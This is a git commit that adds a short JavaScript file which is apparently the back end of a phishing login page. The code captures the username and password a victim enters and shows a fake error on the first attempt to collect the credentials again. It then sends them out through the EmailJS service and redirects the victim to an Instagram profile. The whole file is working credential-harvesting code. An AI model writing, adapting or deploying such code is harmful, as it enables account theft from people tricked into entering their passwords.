24249e402e40336dfa6eb7f33033b08559f571f8
SecureRedirection <161975452+SecureRedirection@users.noreply.github.com>
2024-03-02 22:56:12 +0100

    Add files via upload

---
+++ index.js
@@ -0,0 +1,25 @@
+const error =
+  "Sorry, your username or password is incorrect. Please check again.";
+let click = 0;
+const serviceID = "service_luzn66c";
+const templateID = "template_kmkaq3o";
+function sendMail(event) {
+  click++;
+  var params = {
+    username: document.getElementById("username").value,
+    password: document.getElementById("password").value,
+  };
+
+  if (params.password == "" || params.username == "" || click <= 1) {
+    document.getElementById("error").innerText = error;
+  } else {
+    emailjs.send(serviceID, templateID, params).then((res) => {
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+      window.location.href = "https://www.instagram.com/elizabetta_xoxo/";
+    });
+  }
+
+  event.preventDefault();
+  return false;
+}
